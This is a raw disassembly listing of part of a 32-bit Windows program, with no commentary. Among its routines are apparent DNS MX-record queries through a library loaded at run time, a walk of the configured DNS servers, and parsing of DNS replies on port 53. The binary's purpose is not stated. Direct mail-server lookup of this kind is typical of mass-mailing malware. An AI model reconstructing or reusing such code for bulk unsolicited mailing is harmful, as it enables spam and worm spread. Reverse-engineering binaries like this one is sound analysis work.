  4031c3:	8b c6                	mov    %esi,%eax
  4031c5:	75 f0                	jne    0x4031b7
  4031c7:	5f                   	pop    %edi
  4031c8:	5e                   	pop    %esi
  4031c9:	5b                   	pop    %ebx
  4031ca:	c3                   	ret
  4031cb:	90                   	nop
  4031cc:	90                   	nop
  4031cd:	90                   	nop
  4031ce:	90                   	nop
  4031cf:	90                   	nop
  4031d0:	81 ec 24 01 00 00    	sub    $0x124,%esp
  4031d6:	53                   	push   %ebx
  4031d7:	55                   	push   %ebp
  4031d8:	56                   	push   %esi
  4031d9:	8b b4 24 38 01 00 00 	mov    0x138(%esp),%esi
  4031e0:	57                   	push   %edi
  4031e1:	33 ff                	xor    %edi,%edi
  4031e3:	83 fe 0c             	cmp    $0xc,%esi
  4031e6:	89 7c 24 10          	mov    %edi,0x10(%esp)
  4031ea:	89 7c 24 14          	mov    %edi,0x14(%esp)
  4031ee:	7d 0d                	jge    0x4031fd
  4031f0:	5f                   	pop    %edi
  4031f1:	5e                   	pop    %esi
  4031f2:	5d                   	pop    %ebp
  4031f3:	33 c0                	xor    %eax,%eax
  4031f5:	5b                   	pop    %ebx
  4031f6:	81 c4 24 01 00 00    	add    $0x124,%esp
  4031fc:	c3                   	ret
  4031fd:	8b ac 24 38 01 00 00 	mov    0x138(%esp),%ebp
  403204:	55                   	push   %ebp
  403205:	56                   	push   %esi
  403206:	6a 0c                	push   $0xc
  403208:	55                   	push   %ebp
  403209:	e8 52 01 00 00       	call   0x403360
  40320e:	8b d8                	mov    %eax,%ebx
  403210:	83 c4 10             	add    $0x10,%esp
  403213:	3b de                	cmp    %esi,%ebx
  403215:	7c 0d                	jl     0x403224
  403217:	5f                   	pop    %edi
  403218:	5e                   	pop    %esi
  403219:	5d                   	pop    %ebp
  40321a:	33 c0                	xor    %eax,%eax
  40321c:	5b                   	pop    %ebx
  40321d:	81 c4 24 01 00 00    	add    $0x124,%esp
  403223:	c3                   	ret
  403224:	33 c0                	xor    %eax,%eax
  403226:	33 c9                	xor    %ecx,%ecx
  403228:	66 8b 45 0a          	mov    0xa(%ebp),%ax
  40322c:	66 8b 4d 08          	mov    0x8(%ebp),%cx
  403230:	33 d2                	xor    %edx,%edx
  403232:	03 c1                	add    %ecx,%eax
  403234:	66 8b 55 06          	mov    0x6(%ebp),%dx
  403238:	89 7c 24 18          	mov    %edi,0x18(%esp)
  40323c:	03 c2                	add    %edx,%eax
  40323e:	3b c7                	cmp    %edi,%eax
  403240:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403244:	0f 8e 04 01 00 00    	jle    0x40334e
  40324a:	eb 07                	jmp    0x403253
  40324c:	8b b4 24 3c 01 00 00 	mov    0x13c(%esp),%esi
  403253:	3b de                	cmp    %esi,%ebx
  403255:	0f 8d f3 00 00 00    	jge    0x40334e
  40325b:	b9 45 00 00 00       	mov    $0x45,%ecx
  403260:	33 c0                	xor    %eax,%eax
  403262:	8d 7c 24 20          	lea    0x20(%esp),%edi
  403266:	f3 ab                	rep stos %eax,%es:(%edi)
  403268:	8d 44 24 24          	lea    0x24(%esp),%eax
  40326c:	50                   	push   %eax
  40326d:	56                   	push   %esi
  40326e:	53                   	push   %ebx
  40326f:	55                   	push   %ebp
  403270:	e8 6b fe ff ff       	call   0x4030e0
  403275:	8b d8                	mov    %eax,%ebx
  403277:	83 c4 10             	add    $0x10,%esp
  40327a:	8d 4b 0a             	lea    0xa(%ebx),%ecx
  40327d:	3b ce                	cmp    %esi,%ecx
  40327f:	0f 8d c9 00 00 00    	jge    0x40334e
  403285:	66 8b 14 2b          	mov    (%ebx,%ebp,1),%dx
  403289:	8b 3d 50 71 40 00    	mov    0x407150,%edi
  40328f:	52                   	push   %edx
  403290:	ff d7                	call   *%edi
  403292:	83 c3 02             	add    $0x2,%ebx
  403295:	66 89 84 24 28 01 00 	mov    %ax,0x128(%esp)
  40329c:	00 
  40329d:	66 8b 04 2b          	mov    (%ebx,%ebp,1),%ax
  4032a1:	50                   	push   %eax
  4032a2:	ff d7                	call   *%edi
  4032a4:	83 c3 06             	add    $0x6,%ebx
  4032a7:	66 89 84 24 2a 01 00 	mov    %ax,0x12a(%esp)
  4032ae:	00 
  4032af:	66 8b 0c 2b          	mov    (%ebx,%ebp,1),%cx
  4032b3:	51                   	push   %ecx
  4032b4:	ff d7                	call   *%edi
  4032b6:	66 89 84 24 2c 01 00 	mov    %ax,0x12c(%esp)
  4032bd:	00 
  4032be:	8b 94 24 2c 01 00 00 	mov    0x12c(%esp),%edx
  4032c5:	83 c3 02             	add    $0x2,%ebx
  4032c8:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  4032ce:	03 d3                	add    %ebx,%edx
  4032d0:	89 9c 24 30 01 00 00 	mov    %ebx,0x130(%esp)
  4032d7:	3b d6                	cmp    %esi,%edx
  4032d9:	7f 73                	jg     0x40334e
  4032db:	68 24 01 00 00       	push   $0x124
  4032e0:	6a 00                	push   $0x0
  4032e2:	ff 15 90 70 40 00    	call   *0x407090
  4032e8:	50                   	push   %eax
  4032e9:	ff 15 94 70 40 00    	call   *0x407094
  4032ef:	8b d0                	mov    %eax,%edx
  4032f1:	85 d2                	test   %edx,%edx
  4032f3:	74 59                	je     0x40334e
  4032f5:	b9 49 00 00 00       	mov    $0x49,%ecx
  4032fa:	33 c0                	xor    %eax,%eax
  4032fc:	8b fa                	mov    %edx,%edi
  4032fe:	8d 74 24 20          	lea    0x20(%esp),%esi
  403302:	f3 ab                	rep stos %eax,%es:(%edi)
  403304:	b9 45 00 00 00       	mov    $0x45,%ecx
  403309:	8b fa                	mov    %edx,%edi
  40330b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40330d:	8b 84 24 2c 01 00 00 	mov    0x12c(%esp),%eax
  403314:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  40331a:	25 ff ff 00 00       	and    $0xffff,%eax
  40331f:	03 d8                	add    %eax,%ebx
  403321:	8b 44 24 10          	mov    0x10(%esp),%eax
  403325:	85 c0                	test   %eax,%eax
  403327:	75 0a                	jne    0x403333
  403329:	89 54 24 10          	mov    %edx,0x10(%esp)
  40332d:	89 54 24 14          	mov    %edx,0x14(%esp)
  403331:	eb 06                	jmp    0x403339
  403333:	89 10                	mov    %edx,(%eax)
  403335:	89 54 24 10          	mov    %edx,0x10(%esp)
  403339:	8b 44 24 18          	mov    0x18(%esp),%eax
  40333d:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403341:	40                   	inc    %eax
  403342:	3b c1                	cmp    %ecx,%eax
  403344:	89 44 24 18          	mov    %eax,0x18(%esp)
  403348:	0f 8c fe fe ff ff    	jl     0x40324c
  40334e:	8b 44 24 14          	mov    0x14(%esp),%eax
  403352:	5f                   	pop    %edi
  403353:	5e                   	pop    %esi
  403354:	5d                   	pop    %ebp
  403355:	5b                   	pop    %ebx
  403356:	81 c4 24 01 00 00    	add    $0x124,%esp
  40335c:	c3                   	ret
  40335d:	90                   	nop
  40335e:	90                   	nop
  40335f:	90                   	nop
  403360:	53                   	push   %ebx
  403361:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  403365:	55                   	push   %ebp
  403366:	8b 2d 50 71 40 00    	mov    0x407150,%ebp
  40336c:	66 8b 43 04          	mov    0x4(%ebx),%ax
  403370:	56                   	push   %esi
  403371:	57                   	push   %edi
  403372:	50                   	push   %eax
  403373:	33 ff                	xor    %edi,%edi
  403375:	ff d5                	call   *%ebp
  403377:	66 85 c0             	test   %ax,%ax
  40337a:	76 42                	jbe    0x4033be
  40337c:	8b 74 24 18          	mov    0x18(%esp),%esi
  403380:	3b 74 24 1c          	cmp    0x1c(%esp),%esi
  403384:	7d 31                	jge    0x4033b7
  403386:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40338a:	33 c0                	xor    %eax,%eax
  40338c:	8a 04 31             	mov    (%ecx,%esi,1),%al
  40338f:	85 c0                	test   %eax,%eax
  403391:	75 05                	jne    0x403398
  403393:	83 c6 05             	add    $0x5,%esi
  403396:	eb 0e                	jmp    0x4033a6
  403398:	83 f8 40             	cmp    $0x40,%eax
  40339b:	7d 06                	jge    0x4033a3
  40339d:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  4033a1:	eb 04                	jmp    0x4033a7
  4033a3:	83 c6 06             	add    $0x6,%esi
  4033a6:	47                   	inc    %edi
  4033a7:	66 8b 53 04          	mov    0x4(%ebx),%dx
  4033ab:	52                   	push   %edx
  4033ac:	ff d5                	call   *%ebp
  4033ae:	25 ff ff 00 00       	and    $0xffff,%eax
  4033b3:	3b f8                	cmp    %eax,%edi
  4033b5:	7c c9                	jl     0x403380
  4033b7:	8b c6                	mov    %esi,%eax
  4033b9:	5f                   	pop    %edi
  4033ba:	5e                   	pop    %esi
  4033bb:	5d                   	pop    %ebp
  4033bc:	5b                   	pop    %ebx
  4033bd:	c3                   	ret
  4033be:	8b 44 24 18          	mov    0x18(%esp),%eax
  4033c2:	5f                   	pop    %edi
  4033c3:	5e                   	pop    %esi
  4033c4:	5d                   	pop    %ebp
  4033c5:	5b                   	pop    %ebx
  4033c6:	c3                   	ret
  4033c7:	90                   	nop
  4033c8:	90                   	nop
  4033c9:	90                   	nop
  4033ca:	90                   	nop
  4033cb:	90                   	nop
  4033cc:	90                   	nop
  4033cd:	90                   	nop
  4033ce:	90                   	nop
  4033cf:	90                   	nop
  4033d0:	56                   	push   %esi
  4033d1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4033d5:	56                   	push   %esi
  4033d6:	e8 15 00 00 00       	call   0x4033f0
  4033db:	83 c4 04             	add    $0x4,%esp
  4033de:	85 c0                	test   %eax,%eax
  4033e0:	75 09                	jne    0x4033eb
  4033e2:	56                   	push   %esi
  4033e3:	e8 08 01 00 00       	call   0x4034f0
  4033e8:	83 c4 04             	add    $0x4,%esp
  4033eb:	5e                   	pop    %esi
  4033ec:	c3                   	ret
  4033ed:	90                   	nop
  4033ee:	90                   	nop
  4033ef:	90                   	nop
  4033f0:	83 ec 10             	sub    $0x10,%esp
  4033f3:	8b 0d cc 86 40 00    	mov    0x4086cc,%ecx
  4033f9:	a1 c8 86 40 00       	mov    0x4086c8,%eax
  4033fe:	66 8b 15 d0 86 40 00 	mov    0x4086d0,%dx
  403405:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  403409:	89 44 24 04          	mov    %eax,0x4(%esp)
  40340d:	a0 d2 86 40 00       	mov    0x4086d2,%al
  403412:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403416:	66 89 54 24 0c       	mov    %dx,0xc(%esp)
  40341b:	51                   	push   %ecx
  40341c:	88 44 24 12          	mov    %al,0x12(%esp)
  403420:	ff 15 70 70 40 00    	call   *0x407070
  403426:	85 c0                	test   %eax,%eax
  403428:	75 13                	jne    0x40343d
  40342a:	8d 54 24 04          	lea    0x4(%esp),%edx
  40342e:	52                   	push   %edx
  40342f:	ff 15 58 70 40 00    	call   *0x407058
  403435:	85 c0                	test   %eax,%eax
  403437:	75 04                	jne    0x40343d
  403439:	83 c4 10             	add    $0x10,%esp
  40343c:	c3                   	ret
  40343d:	68 bc 86 40 00       	push   $0x4086bc
  403442:	50                   	push   %eax
  403443:	ff 15 a0 70 40 00    	call   *0x4070a0
  403449:	85 c0                	test   %eax,%eax
  40344b:	75 04                	jne    0x403451
  40344d:	83 c4 10             	add    $0x10,%esp
  403450:	c3                   	ret
  403451:	8b 54 24 14          	mov    0x14(%esp),%edx
  403455:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  403459:	6a 00                	push   $0x0
  40345b:	51                   	push   %ecx
  40345c:	6a 00                	push   $0x0
  40345e:	6a 00                	push   $0x0
  403460:	6a 0f                	push   $0xf
  403462:	52                   	push   %edx
  403463:	ff d0                	call   *%eax
  403465:	85 c0                	test   %eax,%eax
  403467:	74 06                	je     0x40346f
  403469:	33 c0                	xor    %eax,%eax
  40346b:	83 c4 10             	add    $0x10,%esp
  40346e:	c3                   	ret
  40346f:	53                   	push   %ebx
  403470:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  403474:	55                   	push   %ebp
  403475:	33 ed                	xor    %ebp,%ebp
  403477:	56                   	push   %esi
  403478:	57                   	push   %edi
  403479:	85 db                	test   %ebx,%ebx
  40347b:	89 6c 24 24          	mov    %ebp,0x24(%esp)
  40347f:	74 5d                	je     0x4034de
  403481:	66 83 7b 08 0f       	cmpw   $0xf,0x8(%ebx)
  403486:	75 50                	jne    0x4034d8
  403488:	68 08 01 00 00       	push   $0x108
  40348d:	6a 00                	push   $0x0
  40348f:	ff 15 90 70 40 00    	call   *0x407090
  403495:	50                   	push   %eax
  403496:	ff 15 94 70 40 00    	call   *0x407094
  40349c:	8b f0                	mov    %eax,%esi
  40349e:	85 f6                	test   %esi,%esi
  4034a0:	74 3c                	je     0x4034de
  4034a2:	b9 42 00 00 00       	mov    $0x42,%ecx
  4034a7:	33 c0                	xor    %eax,%eax
  4034a9:	8b fe                	mov    %esi,%edi
  4034ab:	68 ff 00 00 00       	push   $0xff
  4034b0:	f3 ab                	rep stos %eax,%es:(%edi)
  4034b2:	66 8b 43 1c          	mov    0x1c(%ebx),%ax
  4034b6:	8d 56 08             	lea    0x8(%esi),%edx
  4034b9:	89 46 04             	mov    %eax,0x4(%esi)
  4034bc:	8b 4b 18             	mov    0x18(%ebx),%ecx
  4034bf:	51                   	push   %ecx
  4034c0:	52                   	push   %edx
  4034c1:	ff 15 98 70 40 00    	call   *0x407098
  4034c7:	85 ed                	test   %ebp,%ebp
  4034c9:	75 08                	jne    0x4034d3
  4034cb:	8b ee                	mov    %esi,%ebp
  4034cd:	89 74 24 24          	mov    %esi,0x24(%esp)
  4034d1:	eb 05                	jmp    0x4034d8
  4034d3:	89 75 00             	mov    %esi,0x0(%ebp)
  4034d6:	8b ee                	mov    %esi,%ebp
  4034d8:	8b 1b                	mov    (%ebx),%ebx
  4034da:	85 db                	test   %ebx,%ebx
  4034dc:	75 a3                	jne    0x403481
  4034de:	8b 44 24 24          	mov    0x24(%esp),%eax
  4034e2:	5f                   	pop    %edi
  4034e3:	5e                   	pop    %esi
  4034e4:	5d                   	pop    %ebp
  4034e5:	5b                   	pop    %ebx
  4034e6:	83 c4 10             	add    $0x10,%esp
  4034e9:	c3                   	ret
  4034ea:	90                   	nop
  4034eb:	90                   	nop
  4034ec:	90                   	nop
  4034ed:	90                   	nop
  4034ee:	90                   	nop
  4034ef:	90                   	nop
  4034f0:	83 ec 1c             	sub    $0x1c,%esp
  4034f3:	68 90 71 40 00       	push   $0x407190
  4034f8:	ff 15 70 70 40 00    	call   *0x407070
  4034fe:	85 c0                	test   %eax,%eax
  403500:	74 05                	je     0x403507
  403502:	83 f8 ff             	cmp    $0xffffffff,%eax
  403505:	75 0b                	jne    0x403512
  403507:	68 90 71 40 00       	push   $0x407190
  40350c:	ff 15 58 70 40 00    	call   *0x407058
  403512:	53                   	push   %ebx
  403513:	56                   	push   %esi
  403514:	85 c0                	test   %eax,%eax
  403516:	0f 84 f3 00 00 00    	je     0x40360f
  40351c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40351f:	0f 84 ea 00 00 00    	je     0x40360f
  403525:	68 d4 86 40 00       	push   $0x4086d4
  40352a:	50                   	push   %eax
  40352b:	ff 15 a0 70 40 00    	call   *0x4070a0
  403531:	8b f0                	mov    %eax,%esi
  403533:	85 f6                	test   %esi,%esi
  403535:	0f 84 d4 00 00 00    	je     0x40360f
  40353b:	68 00 40 00 00       	push   $0x4000
  403540:	6a 00                	push   $0x0
  403542:	ff 15 90 70 40 00    	call   *0x407090
  403548:	50                   	push   %eax
  403549:	ff 15 94 70 40 00    	call   *0x407094
  40354f:	8b d8                	mov    %eax,%ebx
  403551:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403555:	50                   	push   %eax
  403556:	53                   	push   %ebx
  403557:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  40355b:	c7 44 24 14 00 40 00 	movl   $0x4000,0x14(%esp)
  403562:	00 
  403563:	ff d6                	call   *%esi
  403565:	85 c0                	test   %eax,%eax
  403567:	0f 85 a2 00 00 00    	jne    0x40360f
  40356d:	57                   	push   %edi
  40356e:	8d bb 0c 01 00 00    	lea    0x10c(%ebx),%edi
  403574:	85 ff                	test   %edi,%edi
  403576:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40357a:	74 78                	je     0x4035f4
  40357c:	8b 1d 64 71 40 00    	mov    0x407164,%ebx
  403582:	55                   	push   %ebp
  403583:	8b 2d 54 71 40 00    	mov    0x407154,%ebp
  403589:	8d 77 04             	lea    0x4(%edi),%esi
  40358c:	85 f6                	test   %esi,%esi
  40358e:	74 59                	je     0x4035e9
  403590:	6a 35                	push   $0x35
  403592:	66 c7 44 24 20 02 00 	movw   $0x2,0x20(%esp)
  403599:	ff d3                	call   *%ebx
  40359b:	56                   	push   %esi
  40359c:	66 89 44 24 22       	mov    %ax,0x22(%esp)
  4035a1:	ff d5                	call   *%ebp
  4035a3:	85 c0                	test   %eax,%eax
  4035a5:	89 44 24 20          	mov    %eax,0x20(%esp)
  4035a9:	74 05                	je     0x4035b0
  4035ab:	83 f8 ff             	cmp    $0xffffffff,%eax
  4035ae:	75 16                	jne    0x4035c6
  4035b0:	56                   	push   %esi
  4035b1:	ff 15 80 71 40 00    	call   *0x407180
  4035b7:	85 c0                	test   %eax,%eax
  4035b9:	74 2e                	je     0x4035e9
  4035bb:	8b 48 0c             	mov    0xc(%eax),%ecx
  4035be:	8b 11                	mov    (%ecx),%edx
  4035c0:	8b 02                	mov    (%edx),%eax
  4035c2:	89 44 24 20          	mov    %eax,0x20(%esp)
  4035c6:	85 c0                	test   %eax,%eax
  4035c8:	74 1f                	je     0x4035e9
  4035ca:	83 f8 ff             	cmp    $0xffffffff,%eax
  4035cd:	74 1a                	je     0x4035e9
  4035cf:	8b 44 24 30          	mov    0x30(%esp),%eax
  4035d3:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4035d7:	50                   	push   %eax
  4035d8:	51                   	push   %ecx
  4035d9:	e8 f2 f6 ff ff       	call   0x402cd0
  4035de:	83 c4 08             	add    $0x8,%esp
  4035e1:	89 44 24 10          	mov    %eax,0x10(%esp)
  4035e5:	85 c0                	test   %eax,%eax
  4035e7:	75 06                	jne    0x4035ef
  4035e9:	8b 3f                	mov    (%edi),%edi
  4035eb:	85 ff                	test   %edi,%edi
  4035ed:	75 9a                	jne    0x403589
  4035ef:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4035f3:	5d                   	pop    %ebp
  4035f4:	53                   	push   %ebx
  4035f5:	6a 00                	push   $0x0
  4035f7:	ff 15 90 70 40 00    	call   *0x407090
  4035fd:	50                   	push   %eax
  4035fe:	ff 15 6c 70 40 00    	call   *0x40706c
  403604:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403608:	5f                   	pop    %edi
  403609:	5e                   	pop    %esi
  40360a:	5b                   	pop    %ebx
  40360b:	83 c4 1c             	add    $0x1c,%esp
  40360e:	c3                   	ret
  40360f:	5e                   	pop    %esi
  403610:	33 c0                	xor    %eax,%eax
  403612:	5b                   	pop    %ebx
  403613:	83 c4 1c             	add    $0x1c,%esp
  403616:	c3                   	ret
  403617:	90                   	nop
  403618:	90                   	nop
  403619:	90                   	nop
  40361a:	90                   	nop
  40361b:	90                   	nop
  40361c:	90                   	nop
  40361d:	90                   	nop
  40361e:	90                   	nop
  40361f:	90                   	nop
  403620:	8b 44 24 04          	mov    0x4(%esp),%eax
  403624:	85 c0                	test   %eax,%eax
  403626:	74 22                	je     0x40364a
  403628:	53                   	push   %ebx
  403629:	8b 1d 90 70 40 00    	mov    0x407090,%ebx
  40362f:	56                   	push   %esi
  403630:	57                   	push   %edi
  403631:	8b 3d 6c 70 40 00    	mov    0x40706c,%edi
  403637:	8b 30                	mov    (%eax),%esi
  403639:	50                   	push   %eax
  40363a:	6a 00                	push   $0x0
  40363c:	ff d3                	call   *%ebx
  40363e:	50                   	push   %eax
  40363f:	ff d7                	call   *%edi
  403641:	85 f6                	test   %esi,%esi
  403643:	8b c6                	mov    %esi,%eax
  403645:	75 f0                	jne    0x403637
  403647:	5f                   	pop    %edi
  403648:	5e                   	pop    %esi
  403649:	5b                   	pop    %ebx
  40364a:	c3                   	ret
  40364b:	90                   	nop
  40364c:	90                   	nop
  40364d:	90                   	nop
  40364e:	90                   	nop
  40364f:	90                   	nop
  403650:	ff 25 80 71 40 00    	jmp    *0x407180
  403656:	ff 25 7c 71 40 00    	jmp    *0x40717c
  40365c:	ff 25 78 71 40 00    	jmp    *0x407178
  403662:	ff 25 74 71 40 00    	jmp    *0x407174
  403668:	ff 25 70 71 40 00    	jmp    *0x407170
  40366e:	ff 25 6c 71 40 00    	jmp    *0x40716c
  403674:	ff 25 84 71 40 00    	jmp    *0x407184
  40367a:	ff 25 64 71 40 00    	jmp    *0x407164
  403680:	ff 25 60 71 40 00    	jmp    *0x407160
  403686:	ff 25 88 71 40 00    	jmp    *0x407188
  40368c:	ff 25 5c 71 40 00    	jmp    *0x40715c
  403692:	ff 25 58 71 40 00    	jmp    *0x407158
  403698:	ff 25 54 71 40 00    	jmp    *0x407154
  40369e:	55                   	push   %ebp
  40369f:	8b ec                	mov    %esp,%ebp
  4036a1:	6a ff                	push   $0xffffffff
  4036a3:	68 a0 71 40 00       	push   $0x4071a0
  4036a8:	68 d8 42 40 00       	push   $0x4042d8
  4036ad:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4036b3:	50                   	push   %eax
  4036b4:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4036bb:	83 ec 58             	sub    $0x58,%esp
  4036be:	53                   	push   %ebx
  4036bf:	56                   	push   %esi
  4036c0:	57                   	push   %edi
  4036c1:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4036c4:	ff 15 5c 70 40 00    	call   *0x40705c
  4036ca:	33 d2                	xor    %edx,%edx
  4036cc:	8a d4                	mov    %ah,%dl
  4036ce:	89 15 78 97 40 00    	mov    %edx,0x409778
  4036d4:	8b c8                	mov    %eax,%ecx
  4036d6:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4036dc:	89 0d 74 97 40 00    	mov    %ecx,0x409774
  4036e2:	c1 e1 08             	shl    $0x8,%ecx
  4036e5:	03 ca                	add    %edx,%ecx
  4036e7:	89 0d 70 97 40 00    	mov    %ecx,0x409770
  4036ed:	c1 e8 10             	shr    $0x10,%eax
  4036f0:	a3 6c 97 40 00       	mov    %eax,0x40976c
  4036f5:	6a 01                	push   $0x1
  4036f7:	e8 a5 0a 00 00       	call   0x4041a1
  4036fc:	59                   	pop    %ecx
  4036fd:	85 c0                	test   %eax,%eax
  4036ff:	75 08                	jne    0x403709
  403701:	6a 1c                	push   $0x1c
  403703:	e8 c3 00 00 00       	call   0x4037cb
  403708:	59                   	pop    %ecx
  403709:	e8 c5 09 00 00       	call   0x4040d3
  40370e:	85 c0                	test   %eax,%eax
  403710:	75 08                	jne    0x40371a
  403712:	6a 10                	push   $0x10
  403714:	e8 b2 00 00 00       	call   0x4037cb
  403719:	59                   	pop    %ecx
  40371a:	33 f6                	xor    %esi,%esi
  40371c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40371f:	e8 f3 07 00 00       	call   0x403f17
  403724:	ff 15 f4 70 40 00    	call   *0x4070f4
  40372a:	a3 d8 9c 40 00       	mov    %eax,0x409cd8
  40372f:	e8 b1 06 00 00       	call   0x403de5
  403734:	a3 5c 97 40 00       	mov    %eax,0x40975c
  403739:	e8 5a 04 00 00       	call   0x403b98
  40373e:	e8 9c 03 00 00       	call   0x403adf
  403743:	e8 a7 00 00 00       	call   0x4037ef
  403748:	89 75 d0             	mov    %esi,-0x30(%ebp)
  40374b:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40374e:	50                   	push   %eax
  40374f:	ff 15 f0 70 40 00    	call   *0x4070f0
  403755:	e8 2d 03 00 00       	call   0x403a87
  40375a:	89 45 9c             	mov    %eax,-0x64(%ebp)
  40375d:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  403761:	74 06                	je     0x403769
  403763:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  403767:	eb 03                	jmp    0x40376c
  403769:	6a 0a                	push   $0xa
  40376b:	58                   	pop    %eax
  40376c:	50                   	push   %eax
  40376d:	ff 75 9c             	push   -0x64(%ebp)
  403770:	56                   	push   %esi
  403771:	56                   	push   %esi
  403772:	ff 15 70 70 40 00    	call   *0x407070
  403778:	50                   	push   %eax
  403779:	e8 42 ef ff ff       	call   0x4026c0
  40377e:	89 45 a0             	mov    %eax,-0x60(%ebp)
  403781:	50                   	push   %eax
  403782:	e8 95 00 00 00       	call   0x40381c
  403787:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40378a:	8b 08                	mov    (%eax),%ecx
  40378c:	8b 09                	mov    (%ecx),%ecx
  40378e:	89 4d 98             	mov    %ecx,-0x68(%ebp)
  403791:	50                   	push   %eax
  403792:	51                   	push   %ecx
  403793:	e8 77 01 00 00       	call   0x40390f
  403798:	59                   	pop    %ecx
  403799:	59                   	pop    %ecx
  40379a:	c3                   	ret
  40379b:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40379e:	ff 75 98             	push   -0x68(%ebp)
  4037a1:	e8 87 00 00 00       	call   0x40382d
  4037a6:	83 3d 64 97 40 00 01 	cmpl   $0x1,0x409764
  4037ad:	75 05                	jne    0x4037b4
  4037af:	e8 fc 0b 00 00       	call   0x4043b0
  4037b4:	ff 74 24 04          	push   0x4(%esp)
  4037b8:	e8 2c 0c 00 00       	call   0x4043e9
  4037bd:	68 ff 00 00 00       	push   $0xff
  4037c2:	ff 15 e8 86 40 00    	call   *0x4086e8
  4037c8:	59                   	pop    %ecx
  4037c9:	59                   	pop    %ecx
  4037ca:	c3                   	ret
  4037cb:	83 3d 64 97 40 00 01 	cmpl   $0x1,0x409764
  4037d2:	75 05                	jne    0x4037d9
  4037d4:	e8 d7 0b 00 00       	call   0x4043b0
  4037d9:	ff 74 24 04          	push   0x4(%esp)
  4037dd:	e8 07 0c 00 00       	call   0x4043e9
  4037e2:	59                   	pop    %ecx
  4037e3:	68 ff 00 00 00       	push   $0xff
  4037e8:	ff 15 f8 70 40 00    	call   *0x4070f8
  4037ee:	c3                   	ret
  4037ef:	a1 d4 9c 40 00       	mov    0x409cd4,%eax
  4037f4:	85 c0                	test   %eax,%eax
  4037f6:	74 02                	je     0x4037fa
  4037f8:	ff d0                	call   *%eax
  4037fa:	68 10 80 40 00       	push   $0x408010
  4037ff:	68 08 80 40 00       	push   $0x408008
  403804:	e8 ec 00 00 00       	call   0x4038f5
  403809:	68 04 80 40 00       	push   $0x408004
  40380e:	68 00 80 40 00       	push   $0x408000
  403813:	e8 dd 00 00 00       	call   0x4038f5
  403818:	83 c4 10             	add    $0x10,%esp
  40381b:	c3                   	ret
  40381c:	6a 00                	push   $0x0
  40381e:	6a 00                	push   $0x0
  403820:	ff 74 24 0c          	push   0xc(%esp)
  403824:	e8 15 00 00 00       	call   0x40383e
  403829:	83 c4 0c             	add    $0xc,%esp
  40382c:	c3                   	ret
  40382d:	6a 00                	push   $0x0
  40382f:	6a 01                	push   $0x1
  403831:	ff 74 24 0c          	push   0xc(%esp)
  403835:	e8 04 00 00 00       	call   0x40383e
  40383a:	83 c4 0c             	add    $0xc,%esp
  40383d:	c3                   	ret
  40383e:	57                   	push   %edi
  40383f:	e8 9f 00 00 00       	call   0x4038e3
  403844:	6a 01                	push   $0x1
  403846:	5f                   	pop    %edi
  403847:	39 3d a8 97 40 00    	cmp    %edi,0x4097a8
  40384d:	75 11                	jne    0x403860
  40384f:	ff 74 24 08          	push   0x8(%esp)
  403853:	ff 15 00 71 40 00    	call   *0x407100
  403859:	50                   	push   %eax
  40385a:	ff 15 fc 70 40 00    	call   *0x4070fc
  403860:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  403865:	53                   	push   %ebx
  403866:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40386a:	89 3d a4 97 40 00    	mov    %edi,0x4097a4
  403870:	88 1d a0 97 40 00    	mov    %bl,0x4097a0
  403876:	75 3c                	jne    0x4038b4
  403878:	a1 d0 9c 40 00       	mov    0x409cd0,%eax
  40387d:	85 c0                	test   %eax,%eax
  40387f:	74 22                	je     0x4038a3
  403881:	8b 0d cc 9c 40 00    	mov    0x409ccc,%ecx
  403887:	56                   	push   %esi
  403888:	8d 71 fc             	lea    -0x4(%ecx),%esi
  40388b:	3b f0                	cmp    %eax,%esi
  40388d:	72 13                	jb     0x4038a2
  40388f:	8b 06                	mov    (%esi),%eax
  403891:	85 c0                	test   %eax,%eax
  403893:	74 02                	je     0x403897
  403895:	ff d0                	call   *%eax
  403897:	83 ee 04             	sub    $0x4,%esi
  40389a:	3b 35 d0 9c 40 00    	cmp    0x409cd0,%esi
  4038a0:	73 ed                	jae    0x40388f
  4038a2:	5e                   	pop    %esi
  4038a3:	68 18 80 40 00       	push   $0x408018
  4038a8:	68 14 80 40 00       	push   $0x408014
  4038ad:	e8 43 00 00 00       	call   0x4038f5
  4038b2:	59                   	pop    %ecx
  4038b3:	59                   	pop    %ecx
  4038b4:	68 20 80 40 00       	push   $0x408020
  4038b9:	68 1c 80 40 00       	push   $0x40801c
  4038be:	e8 32 00 00 00       	call   0x4038f5
  4038c3:	59                   	pop    %ecx
  4038c4:	59                   	pop    %ecx
  4038c5:	85 db                	test   %ebx,%ebx
  4038c7:	5b                   	pop    %ebx
  4038c8:	74 07                	je     0x4038d1
  4038ca:	e8 1d 00 00 00       	call   0x4038ec
  4038cf:	5f                   	pop    %edi
  4038d0:	c3                   	ret
